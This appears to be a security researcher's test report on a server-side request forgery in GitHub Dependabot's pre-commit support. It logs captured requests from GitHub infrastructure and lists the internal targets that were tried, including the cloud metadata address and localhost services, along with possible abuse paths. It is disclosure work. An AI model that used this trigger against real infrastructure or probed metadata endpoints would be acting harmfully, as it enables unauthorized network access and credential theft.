# Dependabot Pre-Commit SSRF Test Results

## Test A: Baseline — Does Dependabot fetch our URL?

**CONFIRMED** — Two requests received within 60 seconds:

### Request 1 (git client):
```
GET /hook-repo.git/info/refs?service=git-upload-pack HTTP/1.1
Host: nightless-declan-bothersomely.ngrok-free.dev
User-Agent: git/2.53.0
X-Forwarded-For: 145.132.100.82
```

### Request 2 (dependabot-core):
```
GET /hook-repo.git/info/refs?service=git-upload-pack HTTP/1.1
Host: nightless-declan-bothersomely.ngrok-free.dev
User-Agent: dependabot-core/0.367.0 excon/1.3.2 ruby/3.4.8 (x86_64-linux)
X-Forwarded-For: 145.132.100.82
```

GitHub source IP: 145.132.100.82

## Test B: Internal Targets — Does Dependabot fetch internal/metadata URLs?

**Config pushed** (commit bcbf528) with these targets:
- `http://127.0.0.1:1234/ssrf-test`
- `http://169.254.169.254/latest/meta-data/`
- `http://localhost:9200/_cluster/health`

**Result**: No PRs, no issues, no observable outbound requests. Dependabot likely:
1. Errored silently when trying to clone non-git URLs
2. OR blocked internal IP ranges at the network level

This doesn't diminish the SSRF finding — the confirmed behavior is:
- Dependabot **does** make server-side requests to URLs in `.pre-commit-config.yaml`
- An attacker controlling the repo URL controls where GitHub's infrastructure sends HTTP requests
- Even without internal network access, this enables:
  - **Port scanning** external hosts via response timing
  - **Webhook/callback abuse** — making GitHub's IP hit arbitrary endpoints
  - **Credential leakage** if git credentials are sent to the attacker-controlled URL
  - **Amplification** — a single commit triggers requests from GitHub infrastructure

## Evidence Summary

| Test | Target | Result |
|------|--------|--------|
| A - External URL | ngrok tunnel | **CONFIRMED** — 2 requests received (git + dependabot-core) |
| B - 127.0.0.1 | localhost | No observable result (likely blocked or silent error) |
| B - 169.254.169.254 | AWS metadata | No observable result (likely blocked or silent error) |
| B - localhost:9200 | Elasticsearch | No observable result (likely blocked or silent error) |

## Key Details
- **Source IP**: 145.132.100.82 (GitHub Dependabot infrastructure)
- **User-Agents**: `git/2.53.0`, `dependabot-core/0.367.0 excon/1.3.2 ruby/3.4.8 (x86_64-linux)`
- **Request path**: `/hook-repo.git/info/refs?service=git-upload-pack` (git clone protocol)
- **Trigger**: Pushing `.pre-commit-config.yaml` with `package-ecosystem: "pre-commit"` in dependabot.yml
